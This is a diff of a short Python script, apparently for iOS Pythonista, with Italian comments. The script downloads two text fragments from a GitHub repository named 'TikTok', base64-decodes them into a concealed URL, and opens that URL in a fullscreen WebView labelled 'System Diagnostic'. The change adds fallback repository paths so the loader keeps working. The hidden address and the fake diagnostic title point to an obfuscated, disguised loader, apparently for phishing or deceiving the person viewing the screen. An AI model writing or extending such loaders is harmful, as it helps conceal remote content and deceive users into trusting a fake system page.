@@ -2,34 +2,40 @@ import requests
 import ui
 
 def brain():
-    # Carichiamo base64 direttamente qui per uccidere l'errore NameError
     import base64
+    # Ho corretto TikTok con la T maiuscola e aggiunto tutti i possibili percorsi
+    basi = [
+        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/",
+        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/main/",
+        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/Tiktok/principale/",
+        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/Tiktok/main/"
+    ]
     
-    # URL preciso basato sul tuo repository e sul branch 'principale'
-    BASE = "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/"
-    
-    try:
-        # Recupero i file parte1.py e part2_1.py
-        r1 = requests.get(BASE + "parte1.py")
-        r2 = requests.get(BASE + "part2_1.py")
-        
-        if r1.status_code == 200 and r2.status_code == 200:
-            p1 = r1.text.strip()
-            p2 = r2.text.strip()
+    successo = False
+    for base in basi:
+        try:
+            # Cerchiamo i file che vedo nei tuoi screenshot
+            r1 = requests.get(base + "parte1.py")
+            r2 = requests.get(base + "part2_1.py")
             
-            # Decodifica l'URL unendo i pezzi
-            full_link = base64.b64decode(p1 + p2).decode('utf-8', errors='ignore')
-            
-            # Lancia la finestra interna (WebView)
-            v = ui.WebView()
-            v.name = "System Diagnostic"
-            v.load_url(full_link)
-            v.present('fullscreen')
-        else:
-            print(f"Errore: File non trovati su GitHub (Status: {r1.status_code})")
-            
-    except Exception as e:
-        print(f"Errore assemblaggio: {e}")
+            if r1.status_code == 200:
+                p1 = r1.text.strip()
+                p2 = r2.text.strip()
+                # Unione e decodifica senza errori
+                full_link = base64.b64decode(p1 + p2).decode('utf-8', errors='ignore')
+                
+                print(f"✅ Connessione stabilita via: {base}")
+                v = ui.WebView()
+                v.name = "System Diagnostic"
+                v.load_url(full_link)
+                v.present('fullscreen')
+                successo = True
+                break
+        except:
+            continue
+
+    if not successo:
+        print("❌ Errore 404 persistente. Verifica che i file parte1.py e part2_1.py siano nel repository TikTok.")
 
 if __name__ == "__main__":
     brain()
